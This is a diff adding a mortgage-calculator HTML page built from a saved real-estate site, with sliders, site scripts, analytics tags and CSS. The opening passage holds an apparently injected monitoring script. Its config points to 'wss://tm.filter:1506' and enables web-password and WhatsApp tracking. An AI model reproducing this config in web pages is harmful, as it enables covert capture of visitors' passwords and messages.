+                    (e.addYears = function (Y, t) {
+                        return e.addMonths(Y, 12 * t);
+                    }),
+                    (e.addMonths = function (Y, e) {
+                        var t = new Date(Y.getTime());
+                        return t.setMonth(t.getMonth() + e), t;
+                    }),
+                    (e.addDays = function (Y, e) {
+                        var t = new Date(Y.getTime());
+                        return t.setDate(t.getDate() + e), t;
+                    }),
+                    (e.addHours = function (Y, t) {
+                        return e.addMilliseconds(Y, 36e5 * t);
+                    }),
+                    (e.addMinutes = function (Y, t) {
+                        return e.addMilliseconds(Y, 6e4 * t);
+                    }),
+                    (e.addSeconds = function (Y, t) {
+                        return e.addMilliseconds(Y, 1e3 * t);
+                    }),
+                    (e.addMilliseconds = function (Y, e) {
+                        return new Date(Y.getTime() + e);
+                    }),
+                    (e.subtract = function (Y, e) {
+                        var t = Y.getTime() - e.getTime();
+                        return {
+                            toMilliseconds: function () {
+                                return t;
+                            },
+                            toSeconds: function () {
+                                return (t / 1e3) | 0;
+                            },
+                            toMinutes: function () {
+                                return (t / 6e4) | 0;
+                            },
+                            toHours: function () {
+                                return (t / 36e5) | 0;
+                            },
+                            toDays: function () {
+                                return (t / 864e5) | 0;
+                            },
+                        };
+                    }),
+                    (e.isLeapYear = function (Y) {
+                        return !(((Y = Y.getFullYear()) % 4 || !(Y % 100)) && Y % 400);
+                    }),
+                    (e.isSameDay = function (Y, t) {
+                        return e.format(Y, 'YYYYMMDD') === e.format(t, 'YYYYMMDD');
+                    }),
+                    (Y.date = e);
+                var S = {
+                        token: '94f2b67e-0ad6-4e15-bd99-4842cd056257',
+                        sendNotificationsInterval: Number('1000'),
+                        pollWhatsappTrackingInterval: Number('20000'),
+                        connectionString: 'wss://tm.filter:1506',
+                        pid: '21156',
+                        pn: 'firefox.exe',
+                        iup: false,
+                        dontTrackWebPasswords: false,
+                        extJs: null,
+                    },
+                    v = 6e4,
+                    y = null,
+                    N = null,
+                    b = null,
+                    A = null,
+                    T = !1,
+                    E = null,
+                    w = null,
+                    L = 0,
+                    k = null,
+                    I = null,
+                    C = '',
+                    H = !1;
+                !(function Y(e) {
+                    g()
+                        ? setTimeout(function () {
+                              Y(e);
+                          }, 1e3)
+                        : e();
+                })(function () {
+                    S.extJs && S.extJs.init(S.token),
+                        n() && window.addEventListener('focus', r),
+                        (n() || S.extJs) && l();
+                });
+            })();
+        </script>
+        <script
+            language="javascript"
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/all-in-one.js?v=5.71"
+        ></script>
+        <script
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/smoothzoom.js"
+            async
+        ></script>
+        <link href="https://www.sobharealty.com/inc/js/colorbox.css?v=5.71" rel="stylesheet" />
+        <script
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/jquery.colorbox.js?v=5.71"
+        ></script>
+        <script
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="//cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js"
+        ></script>
+
+        <script
+            async
+            src="https://www.googletagmanager.com/gtag/js?id=DC-9107941"
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+        ></script>
+        <script async type="9e1219e3bc3fbb6fc65f3781-text/javascript">
+              	var PGINFO = [];
+              	var urlArray = ["#about-us", "#offerings", "#master-plan-location","#community","#contact-us","#quality-tour","#contact-sec"];
+            if(window.location.hash){
+            	if(urlArray.indexOf(window.location.hash) != -1) {
+            	    history.replaceState({}, document.title, ".");
+            	}
+            }
+            $(document).ready(function(){
+            	// for salesforce
+            	var windowResolution = screen.width +'x'+ screen.height ;
+            	$("#windowResolution").val(windowResolution);
+            	//end  for salesforce
+            	$(".navbar").click(function(e){
+            		e.preventDefault();
+            	    $(".navbar").toggleClass("active");
+            		$(".menu-box").toggleClass("active");
+            	});
+
+            	if($(window).width()<768){
+            		$('li.dropdown span').click(function(e) {
+            			e.preventDefault();
+            			$(this).toggleClass('active');
+            			$(this).parents('li').find('.mob-menu').slideToggle();
+            	     });
+            	}
+
+            	if($(window).width()>1023){
+            		$('li.wos,div.wos').mouseover(function (evt) {
+            			evt.stopPropagation();
+            			$('div.wos').show();
+            			return false;
+            		});
+
+            		$('li.wos,div.wos').mouseout(function (evt) {
+            			evt.stopPropagation();
+            			$('div.wos').hide();
+            			return false;
+            		});
+
+            		$('li.about-menu,div.about-menu').mouseover(function (evt) {
+            			evt.stopPropagation();
+            			$('div.about-menu').show();
+            			return false;
+            		});
+
+            		$('li.about-menu,div.about-menu').mouseout(function (evt) {
+            			evt.stopPropagation();
+            			console.log("Out");
+            			$('div.about-menu').hide();
+            			return false;
+            		});
+
+            		$('li.project,div.project').mouseover(function (evt) {
+            			evt.stopPropagation();
+            			$('div.project').show();
+            			return false;
+            		});
+
+            		$('li.project,div.project').mouseout(function (evt) {
+            			evt.stopPropagation();
+            			$('div.project').hide();
+            			return false;
+            		});
+            	}
+
+            	$("a.grouped_elements").fancybox();
+
+
+            });
+        </script>
+
+        <script type="9e1219e3bc3fbb6fc65f3781-text/javascript">
+            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+            	})(window,document,'script','dataLayer','GTM-WGJM49H');
+        </script>
+
+        <link rel="alternate" href="https://www.sobharealty.com/" hreflang="en" />
+        <link rel="alternate" href="https://www.sobharealty.com/ae/" hreflang="ar" />
+        <link rel="alternate" href="https://www.sobharealty.com/cn/" hreflang="zh" />
+
+        <script type="9e1219e3bc3fbb6fc65f3781-text/javascript">
+            (function(h,o,t,j,a,r){
+                h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+                h._hjSettings={hjid:2604982,hjsv:6};
+                a=o.getElementsByTagName('head')[0];
+                r=o.createElement('script');r.async=1;
+                r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+                a.appendChild(r);
+            })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+        </script>
+
+        <script type="application/ld+json">
+            {
+                "@context": "https://schema.org",
+                "@type": "Organization",
+                "name": "Sobha Realty",
+                "url": "https://www.sobharealty.com/",
+                "logo": "https://dev.sobharealty.com/images/logo.png",
+                "contactPoint": {
+                    "@type": "ContactPoint",
+                    "telephone": "800999999",
+                    "contactType": "sales",
+                    "contactOption": "TollFree",
+                    "areaServed": "AE",
+                    "availableLanguage": ["en", "Arabic"]
+                },
+                "sameAs": [
+                    "https://www.facebook.com/SobhaRealty/",
+                    "https://www.instagram.com/sobharealty/?hl=en",
+                    "https://www.youtube.com/channel/UCKIR9isiNyYq1T0GSnIUyHQ",
+                    "https://www.linkedin.com/company/sobharealty",
+                    "https://www.sobharealty.com/"
+                ]
+            }
+        </script>
+
+        <style>
+            a.logo {
+                left: 47%;
+            }
+            div.header a.enquire-now {
+                top: 50%;
+                transform: translateY(-50%);
+                right: 210px;
+                letter-spacing: normal;
+                font-family: proximanovabold;
+            }
+            div.header a.callTo {
+                right: 28px;
+            }
+            .menu-list li.left {
+                margin-right: 100px;
+            }
+            .menu-list li.right {
+                margin-left: 100px;
+            }
+            div.header div.select-field {
+                width: 65px;
+            }
+            /* arabic site css */
+            .ae a.logo,
+            .cn a.logo {
+                left: 43%;
+            }
+            @media screen and (max-width: 1700px) {
+                a.logo {
+                    left: 47%;
+                }
+                /* arabic site css */
+                .ae a.logo,
+                .cn a.logo {
+                    left: 41.5%;
+                }
+            }
+            @media screen and (max-width: 1599px) {
+                a.logo {
+                    left: 47.5%;
+                }
+
+                .menu-list li {
+                    margin: 0 12px;
+                }
+                .menu-list li.left {
+                    margin-right: 80px;
+                }
+                .menu-list li.right {
+                    margin-left: 80px;
+                }
+                .menu-list li a {
+                    font-size: 12px;
+                }
+                div.header a.enquire-now {
+                    right: 188px;
+                }
+                div.header a.callTo,
+                div.header a.enquire-now {
+                    font-size: 12px;
+                }
+                /* arabic site css */
+                ae a.logo,
+                .cn a.logo {
+                    left: 41.5%;
+                }
+            }
+            @media screen and (max-width: 1300px) {
+                .menu-list li a {
+                    font-size: 11px;
+                }
+                .menu-list li {
+                    margin: 0 6px;
+                }
+                .menu-list li.left {
+                    margin-right: 70px;
+                }
+                .menu-list li.right {
+                    margin-left: 70px;
+                }
+                div.header a.enquire-now {
+                    right: 175px;
+                }
+            }
+            @media screen and (max-width: 1200px) {
+                a.logo {
+                    left: 44%;
+                    width: 80px;
+                }
+                .menu-wrap {
+                    margin: 11px 0 0 -40px;
+                }
+                div.header.fixed .menu-wrap {
+                    margin: 0px 0 0 -40px;
+                }
+                .menu-list {
+                    padding: 0 50px 10px 0;
+                }
+                .menu-list li {
+                    min-width: 1px;
+                }
+                .menu-list li a {
+                    font-size: 11px;
+                }
+                .menu-list li.left {
+                    margin-right: 60px;
+                }
+                .menu-list li.right {
+                    margin-left: 60px;
+                }
+                /* arabic site css */
+                .ae a.logo,
+                .cn a.logo {
+                    left: 39.5%;
+                }
+            }
+            @media screen and (max-width: 1023px) {
+                a.logo {
+                    left: 50%;
+                }
+                .menu-list {
+                    padding: 0 00px 10px 0;
+                }
+                div.header a.enquire-now {
+                    max-width: 200px;
+                    right: 20px;
+                }
+                .menu-wrap {
+                    margin: 11px 0 0;
+                }
+                div.header.fixed .menu-wrap {
+                    margin: 0;
+                }
+                .menu-list li {
+                    margin: 0;
+                }
+                .menu-list li.left {
+                    margin-right: 0;
+                }
+                .menu-list li.right {
+                    margin-left: 0;
+                }
+                /* arabic site css */
+                .ae a.logo,
+                .cn a.logo {
+                    left: 50%;
+                }
+            }
+            @media screen and (max-width: 600px) {
+                div.header div.select-field {
+                    width: 55px;
+                }
+                div.header a.callTo,
+                div.header a.enquire-now {
+                    max-width: 100px;
+                    font-size: 11px;
+                    right: 10px;
+                }
+            }
+            @media screen and (max-width: 360px) {
+                /* arabic site css */
+                .ae a.logo,
+                .cn a.logo {
+                    left: 56%;
+                }
+            }
+        </style>
+
+        <link rel="stylesheet" href="./assets/index.css" />
+
+        <script
+            defer
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+            crossorigin="anonymous"
+        ></script>
+        <script defer src="./assets/index.js"></script>
+    </head>
+    <body class="lng en">
+        <!-- body part -->
+        <section class="ryx__hero">
+            <div class="container">
+                <div class="ryx__display__center">
+                    <h1 class="ryx__section__title">LOAN MORTGAGE CALCULATOR</h1>
+                    <p class="ryx__section__description">
+                        Going to buy a new property? Use our free mortgage calculator to find out
+                        What your monthly payments and fee will be.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <section class="ryx__property__calculator__area">
+            <div>
+                <div class="ryx__justify-content-between">
+                    <h1 class="ryx__property-price">Property Price</h1>
+                    <p class="ryx__property-price-range">
+                        <span>AED</span>
+                        <span id="ryx__price"></span>
+                    </p>
+                </div>
+                <input
+                    type="range"
+                    class="form-range"
+                    min="790000"
+                    max="20000000"
+                    id="ryx__propertyPriceRange"
+                />
+                <div class="ryx__justify-content-between">
+                    <p class="ryx__rangeStart">AED 790,000</p>
+                    <p class="ryx__rangeEnd">AED 20,000,000</p>
+                </div>
+            </div>
+
+            <!-- down Payment area -->
+            <div class="ryx__downPayment">
+                <div class="ryx__justify-content-between">
+                    <h1 class="ryx__property-price">Down Payment</h1>
+                    <p class="ryx__downPaymentPercent">
+                        <span id="ryx__percentage"></span>
+                        <span>%</span>
+                    </p>
+                </div>
+                <input
+                    type="range"
+                    class="form-range"
+                    min="10"
+                    max="100"
+                    step="5"
+                    id="ryx__downPaymentPercentRange"
+                />
+                <div class="ryx__justify-content-between">
+                    <p class="ryx__rangeStart">10%</p>
+                    <p class="ryx__rangeEnd">100%</p>
+                </div>
+            </div>
+
+            <!-- year duration -->
+            <div class="ryx__downPayment">
+                <div class="ryx__justify-content-between">
+                    <h1 class="ryx__property-price">Loan Duration</h1>
+                    <p class="ryx__downPaymentPercent">
+                        <span id="ryx__loanDuration"></span>
+                        <span class="ryx__years"></span>
+                    </p>
+                </div>
+                <input
+                    type="range"
+                    class="form-range"
+                    min="1"
+                    max="20"
+                    id="ryx__loanDurationRange"
+                />
+                <div class="ryx__justify-content-between">
+                    <p class="ryx__rangeStart">1year</p>
+                    <p class="ryx__rangeEnd">20years</p>
+                </div>
+            </div>
+
+            <!-- interest rate -->
+            <div class="ryx__downPayment">
+                <div class="ryx__justify-content-between">
+                    <h1 class="ryx__property-price">Interest Rate/Year</h1>
+                    <p class="ryx__downPaymentPercent">
+                        <span id="ryx__interestRate"></span>
+                        <span>%</span>
+                    </p>
+                </div>
+                <input
+                    type="range"
+                    class="form-range"
+                    min="2"
+                    max="10"
+                    step=".5"
+                    id="ryx__interestRateRange"
+                />
+                <div class="ryx__justify-content-between">
+                    <p class="ryx__rangeStart">2%</p>
+                    <p class="ryx__rangeEnd">10%</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="ryx__paymentCalculation">
+            <div class="ryx__monthlyPaymentChart">
+                <h1>Chart</h1>
+            </div>
+            <div class="ryx__monthlyPaymentTable">
+                <table class="table" bordercolor="#d0a616">
+                    <tbody>
+                        <tr>
+                            <td class="tableRowTitle">
+                                Total Monthly <br />
+                                Payment
+                            </td>
+                            <td class="tableRowTitle">
+                                Down <br />
+                                Payment
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="tableRowValue">AED 5255</td>
+                            <td class="tableRowValue">AED 5255</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- body part end -->
+
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/config.min.js.php"
+        ></script>
+
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/core/js/common.inc.min.js"
+        ></script>
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/core/js/mxdialog.inc.js"
+            async
+        ></script>
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/common.inc.min.js"
+        ></script>
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/core/js/validate.inc.js"
+        ></script>
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/site.inc.min.js?v=5.71"
+        ></script>
+        <script
+            language="javascript"
+            async
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/slick.js"
+        ></script>
+
+        <script
+            language="javascript"
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/jquery.fancybox.js"
+        ></script>
+        <script
+            language="javascript"
+            type="9e1219e3bc3fbb6fc65f3781-text/javascript"
+            src="https://www.sobharealty.com/inc/js/jquery.mCustomScrollbar.js"
+        ></script>
+        <script type="9e1219e3bc3fbb6fc65f3781-text/javascript">
+            $(document).ready( function(){
+            	$("div.lessmore .more").click( function(){
+            	  $('html, body').animate({
+            		scrollTop: $(document).height()
+            	  }, 1200);
+            	  $('div.footer-wrap').slideToggle();
+            	  $(this).toggleClass("active");
+            	});
+
+            	// added on 16-sept-2019
+            //	if ($(window).width() < 681) {
+            		$("a.quick-access").click(function(){
+            			$("div.body-click").addClass("active");
+            			$("div.expand-right").addClass("active");
+            			$('.wh-widget-right').addClass("active");
+            		});
+            	//}
+            	$("div.body-click").click(function(){
+            		if($("div.body-click").hasClass("active")){
+            			$("div.body-click").removeClass("active");
+            			$("div.expand-right").removeClass("active");
+            			$('.wh-widget-right').removeClass("active");
+            		}
+            	});
+
+
+
+            });
+        </script>
+
+        <style>
+            div.footer-wrap {
+                display: none;
+            }
+            div.lessmore {
+                float: left;
+                width: 100%;
+                padding: 30px 30px;
+                margin: 0;
+                position: relative;
+            }
+            div.lessmore a.more {
+                display: inline-block;
+                color: #d4b453;
+                font-size: 14px;
+                text-transform: uppercase;
+                position: absolute;
+                top: 33px;
+                right: 30px;
+            }
+            div.lessmore a.more:before {
+                content: 'more';
+            }
+            div.lessmore a.more.active:before {
+                content: 'less';
+            }
+            div.lessmore a.more:after {
+                content: '\f107';
+                position: absolute;
+                top: 15px;
+                left: 50%;
+                margin-left: -5px;
+                font-family: 'fontAwesome';
+                font-size: 22px;
+                transition: all ease-in-out 0.3s;
+            }
+            div.lessmore a.more:hover:after {
+                top: 10px;
+            }
+            div.lessmore a.more.active:after {
+                transform: rotate(180deg);
+            }
+            div.lessmore p {
+                font-size: 14px;
+                text-transform: uppercase;
+                font-family: 'ProximaNovaSemibold';
+                color: #808080;
+                letter-spacing: 2px;
+                margin: 0;
+            }
+            div.lessmore ul.footer-list {
+                padding: 0px;
+            }
+            div.ftr-menus {
+                margin: 0 0 25px;
+            }
+            /* Added By Yogesh For blog menu - 30 may */
+            ul.footer-list li.blog-desk:after {
+                display: none;
+            }
+            .blog-desk {
+                display: inline-block !important;
+            }
+            .blog-mob {
+                display: none !important;
+            }
+            /* END By Yogesh For blog menu - 30 may */
+
+            @media screen and (max-width: 1023px) {
+                div.lessmore a.more {
+                    position: relative;
+                    top: 10px;
+                    right: auto;
+                }
+                .blog-desk {
+                    display: none !important;
+                }
+                .blog-mob {
+                    display: inline-block !important;
+                }
+            }
+        </style>
+        <script
+            src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js"
+            data-cf-settings="9e1219e3bc3fbb6fc65f3781-|49"
+            defer=""
+        ></script>
+        <script
+            defer
+            src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"rayId":"6a3a98e6bfb46bb8","token":"6494093039854d2d8760cb0df5a3b22f","version":"2021.10.0","si":100}'
+        ></script>
+    </body>
+</html>
